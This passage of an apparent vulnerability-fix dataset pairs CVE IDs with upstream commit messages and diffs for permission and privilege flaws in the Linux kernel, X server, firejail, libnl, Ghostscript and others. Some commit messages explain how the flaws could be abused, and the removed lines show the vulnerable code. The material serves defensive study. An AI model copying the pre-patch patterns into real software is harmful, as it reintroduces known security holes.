sendit(sock, _(\"No %s resource defined\\n\"), res_to_str(type));\n@@ -599,6 +600,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n       break;\n \n    case R_CLIENT:\n+      if (!acl_access_ok(ua, Client_ACL, res->res_client.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"Client: name=%s address=%s FDport=%d MaxJobs=%u\\n\"),\n          res->res_client.hdr.name, res->res_client.address, res->res_client.FDport,\n          res->res_client.MaxConcurrentJobs);\n@@ -626,6 +630,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n       break;\n \n    case R_STORAGE:\n+      if (!acl_access_ok(ua, Storage_ACL, res->res_store.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"Storage: name=%s address=%s SDport=%d MaxJobs=%u\\n\"\n \"      DeviceName=%s MediaType=%s StorageId=%s\\n\"),\n          res->res_store.hdr.name, res->res_store.address, res->res_store.SDport,\n@@ -636,6 +643,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n       break;\n \n    case R_CATALOG:\n+      if (!acl_access_ok(ua, Catalog_ACL, res->res_cat.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"Catalog: name=%s address=%s DBport=%d db_name=%s\\n\"\n \"      db_driver=%s db_user=%s MutliDBConn=%d\\n\"),\n          res->res_cat.hdr.name, NPRT(res->res_cat.db_address),\n@@ -646,6 +656,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n \n    case R_JOB:\n    case R_JOBDEFS:\n+      if (!acl_access_ok(ua, Job_ACL, res->res_job.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"%s: name=%s JobType=%d level=%s Priority=%d Enabled=%d\\n\"),\n          type == R_JOB ? _(\"Job\") : _(\"JobDefs\"),\n          res->res_job.hdr.name, res->res_job.JobType,\n@@ -767,6 +780,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n    case R_FILESET:\n    {\n       int i, j, k;\n+      if (!acl_access_ok(ua, FileSet_ACL, res->res_fs.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"FileSet: name=%s\\n\"), res->res_fs.hdr.name);\n       for (i=0; i<res->res_fs.num_includes; i++) {\n          INCEXE *incexe = res->res_fs.include_items[i];\n@@ -854,6 +870,9 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n    }\n \n    case R_SCHEDULE:\n+      if (!acl_access_ok(ua, Schedule_ACL, res->res_sch.hdr.name)) {\n+         break;\n+      }\n       if (res->res_sch.run) {\n          int i;\n          RUN *run = res->res_sch.run;\n@@ -942,6 +961,9 @@ next_run:\n       break;\n \n    case R_POOL:\n+      if (!acl_access_ok(ua, Pool_ACL, res->res_pool.hdr.name)) {\n+         break;\n+      }\n       sendit(sock, _(\"Pool: name=%s PoolType=%s\\n\"), res->res_pool.hdr.name,\n               res->res_pool.pool_type);\n       sendit(sock, _(\"      use_cat=%d use_once=%d cat_files=%d\\n\"),\n-- \ncgit v0.11.2\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-13721","CWE_ID":"264","category":"security","commit_id":"b95f25af141d33a65f6f821ea9c003f66a01e1f1","commit_message":"From b95f25af141d33a65f6f821ea9c003f66a01e1f1 Mon Sep 17 00:00:00 2001\nFrom: Michal Srb <msrb@suse.com>\nDate: Fri, 28 Jul 2017 16:27:10 +0200\nSubject: Xext\/shm: Validate shmseg resource id (CVE-2017-13721)\n\nOtherwise it can belong to a non-existing client and abort X server with\nFatalError \"client not in use\", or overwrite existing segment of another\nexisting client.\n\nSigned-off-by: Julien Cristau <jcristau@debian.org>\n---\n Xext\/shm.c | 1 +\n 1 file changed, 1 insertion(+)\n\n","diff_code":"diff --git a\/Xext\/shm.c b\/Xext\/shm.c\nindex 91ea90b..2f9a788 100644\n--- a\/Xext\/shm.c\n+++ b\/Xext\/shm.c\n@@ -1238,6 +1238,7 @@ ProcShmCreateSegment(ClientPtr client)\n     };\n \n     REQUEST_SIZE_MATCH(xShmCreateSegmentReq);\n+    LEGAL_NEW_RESOURCE(stuff->shmseg, client);\n     if ((stuff->readOnly != xTrue) && (stuff->readOnly != xFalse)) {\n         client->errorValue = stuff->readOnly;\n         return BadValue;\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-10972","CWE_ID":"264","category":"security","commit_id":"05442de962d3dc624f79fc1a00eca3ffc5489ced","commit_message":"From 05442de962d3dc624f79fc1a00eca3ffc5489ced Mon Sep 17 00:00:00 2001\nFrom: Michal Srb <msrb@suse.com>\nDate: Wed, 24 May 2017 15:54:39 +0300\nSubject: Xi: Zero target buffer in SProcXSendExtensionEvent.\n\nMake sure that the xEvent eventT is initialized with zeros, the same way as\nin SProcSendEvent.\n\nSome event swapping functions do not overwrite all 32 bytes of xEvent\nstructure, for example XSecurityAuthorizationRevoked. Two cooperating\nclients, one swapped and the other not, can send\nXSecurityAuthorizationRevoked event to each other to retrieve old stack data\nfrom X server. This can be potentialy misused to go around ASLR or\nstack-protector.\n\nSigned-off-by: Michal Srb <msrb@suse.com>\nReviewed-by: Peter Hutterer <peter.hutterer@who-t.net>\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>\n---\n Xi\/sendexev.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/Xi\/sendexev.c b\/Xi\/sendexev.c\nindex 11d8202..1cf118a 100644\n--- a\/Xi\/sendexev.c\n+++ b\/Xi\/sendexev.c\n@@ -78,7 +78,7 @@ SProcXSendExtensionEvent(ClientPtr client)\n {\n     CARD32 *p;\n     int i;\n-    xEvent eventT;\n+    xEvent eventT = { .u.u.type = 0 };\n     xEvent *eventP;\n     EventSwapPtr proc;\n \n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-8967","CWE_ID":"264","category":"security","commit_id":"c623b33b4e9599c6ac5076f7db7369eb9869aa04","commit_message":"From c623b33b4e9599c6ac5076f7db7369eb9869aa04 Mon Sep 17 00:00:00 2001\nFrom: Mark Rutland <mark.rutland@arm.com>\nDate: Thu, 8 Jan 2015 11:42:59 +0000\nSubject: arm64: make sys_call_table const\n\nAs with x86, mark the sys_call_table const such that it will be placed\nin the .rodata section. This will cause attempts to modify the table\n(accidental or deliberate) to fail when strict page permissions are in\nplace. In the absence of strict page permissions, there should be no\nfunctional change.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com>\nAcked-by: Will Deacon <will.deacon@arm.com>\nSigned-off-by: Catalin Marinas <catalin.marinas@arm.com>\n---\n arch\/arm64\/kernel\/sys.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/arm64\/kernel\/sys.c b\/arch\/arm64\/kernel\/sys.c\nindex dec351a9f3d6..75151aaf1a52 100644\n--- a\/arch\/arm64\/kernel\/sys.c\n+++ b\/arch\/arm64\/kernel\/sys.c\n@@ -49,7 +49,7 @@ asmlinkage long sys_rt_sigreturn_wrapper(void);\n  * The sys_call_table array must be 4K aligned to be accessible from\n  * kernel\/entry.S.\n  *\/\n-void *sys_call_table[__NR_syscalls] __aligned(4096) = {\n+void * const sys_call_table[__NR_syscalls] __aligned(4096) = {\n \t[0 ... __NR_syscalls - 1] = sys_ni_syscall,\n #include <asm\/unistd.h>\n };\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1021","CWE_ID":"264","category":"security","commit_id":"526b4af47f44148c9d665e57723ed9f86634c6e3","commit_message":"From 526b4af47f44148c9d665e57723ed9f86634c6e3 Mon Sep 17 00:00:00 2001\nFrom: Thomas Renninger <trenn@suse.de>\nDate: Thu, 26 May 2011 12:26:24 +0200\nSubject: [PATCH] ACPI: Split out custom_method functionality into an own\n driver\n\nWith \/sys\/kernel\/debug\/acpi\/custom_method root can write\nto arbitrary memory and increase his priveleges, even if\nthese are restricted.\n\n-> Make this an own debug .config option and warn about the\nsecurity issue in the config description.\n\n-> Still keep acpi\/debugfs.c which now only creates an empty\n   \/sys\/kernel\/debug\/acpi directory. There might be other\n   users of it later.\n\nSigned-off-by: Thomas Renninger <trenn@suse.de>\nAcked-by: Rafael J. Wysocki <rjw@sisk.pl>\nAcked-by: rui.zhang@intel.com\nSigned-off-by: Len Brown <len.brown@intel.com>\n---\n Documentation\/acpi\/method-customizing.txt |   5 ++\n drivers\/acpi\/Kconfig                      |  15 ++++\n drivers\/acpi\/Makefile                     |   1 +\n drivers\/acpi\/custom_method.c              | 100 ++++++++++++++++++++++\n drivers\/acpi\/debugfs.c                    |  80 +----------------\n 5 files changed, 122 insertions(+), 79 deletions(-)\n create mode 100644 drivers\/acpi\/custom_method.c\n\n","diff_code":"diff --git a\/Documentation\/acpi\/method-customizing.txt b\/Documentation\/acpi\/method-customizing.txt\nindex 3e1d25aee3fb2..5f55373dd53ba 100644\n--- a\/Documentation\/acpi\/method-customizing.txt\n+++ b\/Documentation\/acpi\/method-customizing.txt\n@@ -66,3 +66,8 @@ Note: We can use a kernel with multiple custom ACPI method running,\n       But each individual write to debugfs can implement a SINGLE\n       method override. i.e. if we want to insert\/override multiple\n       ACPI methods, we need to redo step c) ~ g) for multiple times.\n+\n+Note: Be aware that root can mis-use this driver to modify arbitrary\n+      memory and gain additional rights, if root's privileges got\n+      restricted (for example if root is not allowed to load additional\n+      modules after boot).\ndiff --git a\/drivers\/acpi\/Kconfig b\/drivers\/acpi\/Kconfig\nindex 3a17ca5fff6f0..d918e130bef37 100644\n--- a\/drivers\/acpi\/Kconfig\n+++ b\/drivers\/acpi\/Kconfig\n@@ -380,6 +380,21 @@ config ACPI_HED\n \t  which is used to report some hardware errors notified via\n \t  SCI, mainly the corrected errors.\n \n+config ACPI_CUSTOM_METHOD\n+\ttristate \"Allow ACPI methods to be inserted\/replaced at run time\"\n+\tdepends on DEBUG_FS\n+\tdefault n\n+\thelp\n+\t  This debug facility allows ACPI AML methods to me inserted and\/or\n+\t  replaced without rebooting the system. For details refer to:\n+\t  Documentation\/acpi\/method-customizing.txt.\n+\n+\t  NOTE: This option is security sensitive, because it allows arbitrary\n+\t  kernel memory to be written to by root (uid=0) users, allowing them\n+\t  to bypass certain security measures (e.g. if root is not allowed to\n+\t  load additional kernel modules after boot, this feature may be used\n+\t  to override that restriction).\n+\n source \"drivers\/acpi\/apei\/Kconfig\"\n \n endif\t# ACPI\ndiff --git a\/drivers\/acpi\/Makefile b\/drivers\/acpi\/Makefile\nindex d113fa5100b20..cba0b2334b9b8 100644\n--- a\/drivers\/acpi\/Makefile\n+++ b\/drivers\/acpi\/Makefile\n@@ -62,6 +62,7 @@ obj-$(CONFIG_ACPI_SBS)\t\t+= sbs.o\n obj-$(CONFIG_ACPI_POWER_METER)\t+= power_meter.o\n obj-$(CONFIG_ACPI_HED)\t\t+= hed.o\n obj-$(CONFIG_ACPI_EC_DEBUGFS)\t+= ec_sys.o\n+obj-$(CONFIG_ACPI_CUSTOM_METHOD)+= custom_method.o\n \n # processor has its own \"processor.\" module_param namespace\n processor-y\t\t\t:= processor_driver.o processor_throttling.o\ndiff --git a\/drivers\/acpi\/custom_method.c b\/drivers\/acpi\/custom_method.c\nnew file mode 100644\nindex 0000000000000..5d42c2414ae54\n--- \/dev\/null\n+++ b\/drivers\/acpi\/custom_method.c\n@@ -0,0 +1,100 @@\n+\/*\n+ * debugfs.c - ACPI debugfs interface to userspace.\n+ *\/\n+\n+#include <linux\/init.h>\n+#include <linux\/module.h>\n+#include <linux\/kernel.h>\n+#include <linux\/uaccess.h>\n+#include <linux\/debugfs.h>\n+#include <acpi\/acpi_drivers.h>\n+\n+#include \"internal.h\"\n+\n+#define _COMPONENT\t\tACPI_SYSTEM_COMPONENT\n+ACPI_MODULE_NAME(\"custom_method\");\n+MODULE_LICENSE(\"GPL\");\n+\n+static struct dentry *cm_dentry;\n+\n+\/* \/sys\/kernel\/debug\/acpi\/custom_method *\/\n+\n+static ssize_t cm_write(struct file *file, const char __user * user_buf,\n+\t\t\tsize_t count, loff_t *ppos)\n+{\n+\tstatic char *buf;\n+\tstatic u32 max_size;\n+\tstatic u32 uncopied_bytes;\n+\n+\tstruct acpi_table_header table;\n+\tacpi_status status;\n+\n+\tif (!(*ppos)) {\n+\t\t\/* parse the table header to get the table length *\/\n+\t\tif (count <= sizeof(struct acpi_table_header))\n+\t\t\treturn -EINVAL;\n+\t\tif (copy_from_user(&table, user_buf,\n+\t\t\t\t   sizeof(struct acpi_table_header)))\n+\t\t\treturn -EFAULT;\n+\t\tuncopied_bytes = max_size = table.length;\n+\t\tbuf = kzalloc(max_size, GFP_KERNEL);\n+\t\tif (!buf)\n+\t\t\treturn -ENOMEM;\n+\t}\n+\n+\tif (buf == NULL)\n+\t\treturn -EINVAL;\n+\n+\tif ((*ppos > max_size) ||\n+\t    (*ppos + count > max_size) ||\n+\t    (*ppos + count < count) ||\n+\t    (count > uncopied_bytes))\n+\t\treturn -EINVAL;\n+\n+\tif (copy_from_user(buf + (*ppos), user_buf, count)) {\n+\t\tkfree(buf);\n+\t\tbuf = NULL;\n+\t\treturn -EFAULT;\n+\t}\n+\n+\tuncopied_bytes -= count;\n+\t*ppos += count;\n+\n+\tif (!uncopied_bytes) {\n+\t\tstatus = acpi_install_method(buf);\n+\t\tkfree(buf);\n+\t\tbuf = NULL;\n+\t\tif (ACPI_FAILURE(status))\n+\t\t\treturn -EINVAL;\n+\t\tadd_taint(TAINT_OVERRIDDEN_ACPI_TABLE);\n+\t}\n+\n+\treturn count;\n+}\n+\n+static const struct file_operations cm_fops = {\n+\t.write = cm_write,\n+\t.llseek = default_llseek,\n+};\n+\n+static int __init acpi_custom_method_init(void)\n+{\n+\tif (acpi_debugfs_dir == NULL)\n+\t\treturn -ENOENT;\n+\n+\tcm_dentry = debugfs_create_file(\"custom_method\", S_IWUSR,\n+\t\t\t\t\tacpi_debugfs_dir, NULL, &cm_fops);\n+\tif (cm_dentry == NULL)\n+\t\treturn -ENODEV;\n+\n+\treturn 0;\n+}\n+\n+static void __exit acpi_custom_method_exit(void)\n+{\n+\tif (cm_dentry)\n+\t\tdebugfs_remove(cm_dentry);\n+ }\n+\n+module_init(acpi_custom_method_init);\n+module_exit(acpi_custom_method_exit);\ndiff --git a\/drivers\/acpi\/debugfs.c b\/drivers\/acpi\/debugfs.c\nindex e7abc6e3bba01..182a9fc363553 100644\n--- a\/drivers\/acpi\/debugfs.c\n+++ b\/drivers\/acpi\/debugfs.c\n@@ -3,9 +3,6 @@\n  *\/\n \n #include <linux\/init.h>\n-#include <linux\/module.h>\n-#include <linux\/kernel.h>\n-#include <linux\/uaccess.h>\n #include <linux\/debugfs.h>\n #include <acpi\/acpi_drivers.h>\n \n@@ -13,84 +10,9 @@\n ACPI_MODULE_NAME(\"debugfs\");\n \n struct dentry *acpi_debugfs_dir;\n-static struct dentry *cm_dentry;\n-\n-\/* \/sys\/kernel\/debug\/acpi\/custom_method *\/\n-\n-static ssize_t cm_write(struct file *file, const char __user * user_buf,\n-\t\t\tsize_t count, loff_t *ppos)\n-{\n-\tstatic char *buf;\n-\tstatic u32 max_size;\n-\tstatic u32 uncopied_bytes;\n-\n-\tstruct acpi_table_header table;\n-\tacpi_status status;\n-\n-\tif (!(*ppos)) {\n-\t\t\/* parse the table header to get the table length *\/\n-\t\tif (count <= sizeof(struct acpi_table_header))\n-\t\t\treturn -EINVAL;\n-\t\tif (copy_from_user(&table, user_buf,\n-\t\t\t\t   sizeof(struct acpi_table_header)))\n-\t\t\treturn -EFAULT;\n-\t\tuncopied_bytes = max_size = table.length;\n-\t\tbuf = kzalloc(max_size, GFP_KERNEL);\n-\t\tif (!buf)\n-\t\t\treturn -ENOMEM;\n-\t}\n-\n-\tif (buf == NULL)\n-\t\treturn -EINVAL;\n-\n-\tif ((*ppos > max_size) ||\n-\t    (*ppos + count > max_size) ||\n-\t    (*ppos + count < count) ||\n-\t    (count > uncopied_bytes))\n-\t\treturn -EINVAL;\n-\n-\tif (copy_from_user(buf + (*ppos), user_buf, count)) {\n-\t\tkfree(buf);\n-\t\tbuf = NULL;\n-\t\treturn -EFAULT;\n-\t}\n-\n-\tuncopied_bytes -= count;\n-\t*ppos += count;\n-\n-\tif (!uncopied_bytes) {\n-\t\tstatus = acpi_install_method(buf);\n-\t\tkfree(buf);\n-\t\tbuf = NULL;\n-\t\tif (ACPI_FAILURE(status))\n-\t\t\treturn -EINVAL;\n-\t\tadd_taint(TAINT_OVERRIDDEN_ACPI_TABLE);\n-\t}\n-\n-\treturn count;\n-}\n-\n-static const struct file_operations cm_fops = {\n-\t.write = cm_write,\n-\t.llseek = default_llseek,\n-};\n-\n-static int __init acpi_custom_method_init(void)\n-{\n-\tif (!acpi_debugfs_dir)\n-\t\treturn -ENOENT;\n-\n-\tcm_dentry = debugfs_create_file(\"custom_method\", S_IWUSR,\n-\t\t\t\t\tacpi_debugfs_dir, NULL, &cm_fops);\n-\tif (!cm_dentry)\n-\t\treturn -ENODEV;\n-\n-\treturn 0;\n-}\n+EXPORT_SYMBOL_GPL(acpi_debugfs_dir);\n \n void __init acpi_debugfs_init(void)\n {\n \tacpi_debugfs_dir = debugfs_create_dir(\"acpi\", NULL);\n-\n-\tacpi_custom_method_init();\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-5207","CWE_ID":"264","category":"security","commit_id":"5d43fdcd215203868d440ffc42036f5f5ffc89fc","commit_message":"From 5d43fdcd215203868d440ffc42036f5f5ffc89fc Mon Sep 17 00:00:00 2001\nFrom: netblue30 <netblue30@yahoo.com>\nDate: Fri, 6 Jan 2017 22:45:11 -0500\nSubject: [PATCH] security fix\n\n---\n RELNOTES                 | 1 +\n src\/firejail\/bandwidth.c | 9 +--------\n 2 files changed, 2 insertions(+), 8 deletions(-)\n\n","diff_code":"diff --git a\/RELNOTES b\/RELNOTES\nindex 969eecb24..b9a982d77 100644\n--- a\/RELNOTES\n+++ b\/RELNOTES\n@@ -1,5 +1,6 @@\n firejail (0.9.45) baseline; urgency=low\n   * development version, work in progress\n+  * security: --bandwidth root shel found by Martin Carpenter\n   * security: disabled --allow-debuggers when running on kernel\n     versions prior to 4.8; a kernel bug in ptrace system call\n     allows a full bypass of seccomp filter; problem reported by Lizzie Dixon\ndiff --git a\/src\/firejail\/bandwidth.c b\/src\/firejail\/bandwidth.c\nindex 5e9002f22..84c9dc53a 100644\n--- a\/src\/firejail\/bandwidth.c\n+++ b\/src\/firejail\/bandwidth.c\n@@ -435,15 +435,8 @@ void bandwidth_pid(pid_t pid, const char *command, const char *dev, int down, in\n \tif (setregid(0, 0))\n \t\terrExit(\"setregid\");\n \n-\tif (!cfg.shell)\n-\t\tcfg.shell = guess_shell();\n-\tif (!cfg.shell) {\n-\t\tfprintf(stderr, \"Error: no POSIX shell found, please use --shell command line option\\n\");\n-\t\texit(1);\n-\t}\n-\n \tchar *arg[4];\n-\targ[0] = cfg.shell;\n+\targ[0] = \"\/bin\/sh\";\n \targ[1] = \"-c\";\n \targ[2] = cmd;\n \targ[3] = NULL;\n","owner":"netblue30","repo":"firejail","source":"cve"},{"CVE_ID":"CVE-2017-0553","CWE_ID":"264","category":"security","commit_id":"3e18948f17148e6a3c4255bdeaaf01ef6081ceeb","commit_message":"From 3e18948f17148e6a3c4255bdeaaf01ef6081ceeb Mon Sep 17 00:00:00 2001\nFrom: Thomas Haller <thaller@redhat.com>\nDate: Mon, 6 Feb 2017 22:23:52 +0100\nSubject: [PATCH] lib: check for integer-overflow in nlmsg_reserve()\n\nIn general, libnl functions are not robust against calling with\ninvalid arguments. Thus, never call libnl functions with invalid\narguments. In case of nlmsg_reserve() this means never provide\na @len argument that causes overflow.\n\nStill, add an additional safeguard to avoid exploiting such bugs.\n\nAssume that @pad is a trusted, small integer.\nAssume that n->nm_size is a valid number of allocated bytes (and thus\nmuch smaller then SIZE_T_MAX).\nAssume, that @len may be set to an untrusted value. Then the patch\navoids an integer overflow resulting in reserving too few bytes.\n---\n lib\/msg.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/lib\/msg.c b\/lib\/msg.c\nindex 9af3f3a..3e27d4e 100644\n--- a\/lib\/msg.c\n+++ b\/lib\/msg.c\n@@ -411,6 +411,9 @@ void *nlmsg_reserve(struct nl_msg *n, size_t len, int pad)\n \tsize_t nlmsg_len = n->nm_nlh->nlmsg_len;\n \tsize_t tlen;\n \n+\tif (len > n->nm_size)\n+\t\treturn NULL;\n+\n \ttlen = pad ? ((len + (pad - 1)) & ~(pad - 1)) : len;\n \n \tif ((tlen + nlmsg_len) > n->nm_size)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-2182","CWE_ID":"264","category":"security","commit_id":"15f72c1ee5e0afad20232bdf0fcecab8d62a5d89","commit_message":"From 15f72c1ee5e0afad20232bdf0fcecab8d62a5d89 Mon Sep 17 00:00:00 2001\nFrom: Eduardo Silva <eduardo@monkey.io>\nDate: Tue, 20 May 2014 11:22:19 -0600\nSubject: [PATCH] Mandril: check decoded URI (fix #92)\n\nSigned-off-by: Eduardo Silva <eduardo@monkey.io>\n---\n plugins\/mandril\/mandril.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/plugins\/mandril\/mandril.c b\/plugins\/mandril\/mandril.c\nindex 8df087b3..820f4416 100644\n--- a\/plugins\/mandril\/mandril.c\n+++ b\/plugins\/mandril\/mandril.c\n@@ -349,7 +349,8 @@ int _mkp_stage_30(struct plugin *p,\n     (void) cs;\n \n     PLUGIN_TRACE(\"[FD %i] Mandril validating URL\", cs->socket);\n-    if (mk_security_check_url(sr->uri) < 0) {\n+\n+    if (mk_security_check_url(sr->uri_processed) < 0) {\n         PLUGIN_TRACE(\"[FD %i] Close connection, blocked URL\", cs->socket);\n         mk_api->header_set_http_status(sr, MK_CLIENT_FORBIDDEN);\n         return MK_PLUGIN_RET_CLOSE_CONX;\n","owner":"monkey","repo":"monkey","source":"cve"},{"CVE_ID":"CVE-2018-16863","CWE_ID":"264","category":"security","commit_id":"78911a01b67d590b4a91afac2e8417360b934156","commit_message":"From 78911a01b67d590b4a91afac2e8417360b934156 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Thu, 23 Aug 2018 09:54:59 +0100\nSubject: [PATCH] Bug 699654: Check the restore operand type\n\nThe primary function that implements restore correctly checked its parameter,\nbut a function that does some preliminary work for the restore (gstate and\ndevice handling) did not check.\n\nSo, even though the restore correctly errored out, it left things partially done\nand, in particular, the device in partially restored state. Meaning the\nLockSafetyParams was not correctly set.\n---\n psi\/zdevice2.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex de16dd2..9fbb4e3 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -312,6 +312,9 @@ z2grestoreall(i_ctx_t *i_ctx_p)\n static int\n z2restore(i_ctx_t *i_ctx_p)\n {\n+    os_ptr op = osp;\n+    check_type(*op, t_save);\n+\n     while (gs_gstate_saved(gs_gstate_saved(igs))) {\n         if (restore_page_device(igs, gs_gstate_saved(igs)))\n             return push_callout(i_ctx_p, \"%restore1pagedevice\");\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-1738","CWE_ID":"264","category":"security","commit_id":"2145e15e0557a01b9195d1c7199a1b92cb9be81f","commit_message":"From 2145e15e0557a01b9195d1c7199a1b92cb9be81f Mon Sep 17 00:00:00 2001\nFrom: Matthew Daley <mattd@bugfuzz.com>\nDate: Mon, 28 Apr 2014 19:05:21 +1200\nSubject: [PATCH] floppy: don't write kernel-only members to FDRAWCMD ioctl\n output\n\nDo not leak kernel-only floppy_raw_cmd structure members to userspace.\nThis includes the linked-list pointer and the pointer to the allocated\nDMA space.\n\nSigned-off-by: Matthew Daley <mattd@bugfuzz.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers\/block\/floppy.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/block\/floppy.c b\/drivers\/block\/floppy.c\nindex 12251a6888719..fa9bb742df6e0 100644\n--- a\/drivers\/block\/floppy.c\n+++ b\/drivers\/block\/floppy.c\n@@ -3067,7 +3067,10 @@ static int raw_cmd_copyout(int cmd, void __user *param,\n \tint ret;\n \n \twhile (ptr) {\n-\t\tret = copy_to_user(param, ptr, sizeof(*ptr));\n+\t\tstruct floppy_raw_cmd cmd = *ptr;\n+\t\tcmd.next = NULL;\n+\t\tcmd.kernel_data = NULL;\n+\t\tret = copy_to_user(param, &cmd, sizeof(cmd));\n \t\tif (ret)\n \t\t\treturn -EFAULT;\n \t\tparam += sizeof(struct floppy_raw_cmd);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-13405","CWE_ID":"264","category":"security","commit_id":"0fa3ecd87848c9c93c2c828ef4c3a8ca36ce46c7","commit_message":"From 0fa3ecd87848c9c93c2c828ef4c3a8ca36ce46c7 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Tue, 3 Jul 2018 17:10:19 -0700\nSubject: Fix up non-directory creation in SGID directories\n\nsgid directories have special semantics, making newly created files in\nthe directory belong to the group of the directory, and newly created\nsubdirectories will also become sgid.  This is historically used for\ngroup-shared directories.\n\nBut group directories writable by non-group members should not imply\nthat such non-group members can magically join the group, so make sure\nto clear the sgid bit on non-directories for non-members (but remember\nthat sgid without group execute means \"mandatory locking\", just to\nconfuse things even more).\n\nReported-by: Jann Horn <jannh@google.com>\nCc: Andy Lutomirski <luto@kernel.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/inode.c | 6 ++++++\n 1 file changed, 6 insertions(+)\n\n","diff_code":"diff --git a\/fs\/inode.c b\/fs\/inode.c\nindex 2c300e981796..8c86c809ca17 100644\n--- a\/fs\/inode.c\n+++ b\/fs\/inode.c\n@@ -1999,8 +1999,14 @@ void inode_init_owner(struct inode *inode, const struct inode *dir,\n \tinode->i_uid = current_fsuid();\n \tif (dir && dir->i_mode & S_ISGID) {\n \t\tinode->i_gid = dir->i_gid;\n+\n+\t\t\/* Directories are special, and always inherit S_ISGID *\/\n \t\tif (S_ISDIR(mode))\n \t\t\tmode |= S_ISGID;\n+\t\telse if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP) &&\n+\t\t\t !in_group_p(inode->i_gid) &&\n+\t\t\t !capable_wrt_inode_uidgid(dir, CAP_FSETID))\n+\t\t\tmode &= ~S_ISGID;\n \t} else\n \t\tinode->i_gid = current_fsgid();\n \tinode->i_mode = mode;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4347","CWE_ID":"264","category":"security","commit_id":"c4e7f9022e506c6635a5037713c37118e23193e4","commit_message":"From c4e7f9022e506c6635a5037713c37118e23193e4 Mon Sep 17 00:00:00 2001\nFrom: Alex Williamson <alex.williamson@redhat.com>\nDate: Thu, 12 Jan 2012 12:39:54 +0200\nSubject: [PATCH] KVM: Device assignment permission checks\n\n(cherry picked from commit 3d27e23b17010c668db311140b17bbbb70c78fb9)\n\nOnly allow KVM device assignment to attach to devices which:\n\n - Are not bridges\n - Have BAR resources (assume others are special devices)\n - The user has permissions to use\n\nAssigning a bridge is a configuration error, it's not supported, and\ntypically doesn't result in the behavior the user is expecting anyway.\nDevices without BAR resources are typically chipset components that\nalso don't have host drivers.  We don't want users to hold such devices\ncaptive or cause system problems by fencing them off into an iommu\ndomain.  We determine \"permission to use\" by testing whether the user\nhas access to the PCI sysfs resource files.  By default a normal user\nwill not have access to these files, so it provides a good indication\nthat an administration agent has granted the user access to the device.\n\n[Yang Bai: add missing #include]\n[avi: fix comment style]\n\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>\nSigned-off-by: Yang Bai <hamo.by@gmail.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n---\n Documentation\/virtual\/kvm\/api.txt |  4 ++\n virt\/kvm\/assigned-dev.c           | 75 +++++++++++++++++++++++++++++++\n 2 files changed, 79 insertions(+)\n\n","diff_code":"diff --git a\/Documentation\/virtual\/kvm\/api.txt b\/Documentation\/virtual\/kvm\/api.txt\nindex 57c9336dfc7eb..13ab8379b4eb0 100644\n--- a\/Documentation\/virtual\/kvm\/api.txt\n+++ b\/Documentation\/virtual\/kvm\/api.txt\n@@ -1134,6 +1134,10 @@ following flags are specified:\n The KVM_DEV_ASSIGN_ENABLE_IOMMU flag is a mandatory option to ensure\n isolation of the device.  Usages not specifying this flag are deprecated.\n \n+Only PCI header type 0 devices with PCI BAR resources are supported by\n+device assignment.  The user requesting this ioctl must have read\/write\n+access to the PCI sysfs resource files associated with the device.\n+\n 4.49 KVM_DEASSIGN_PCI_DEVICE\n \n Capability: KVM_CAP_DEVICE_DEASSIGNMENT\ndiff --git a\/virt\/kvm\/assigned-dev.c b\/virt\/kvm\/assigned-dev.c\nindex 2269d7141fe8d..af7910228fb1c 100644\n--- a\/virt\/kvm\/assigned-dev.c\n+++ 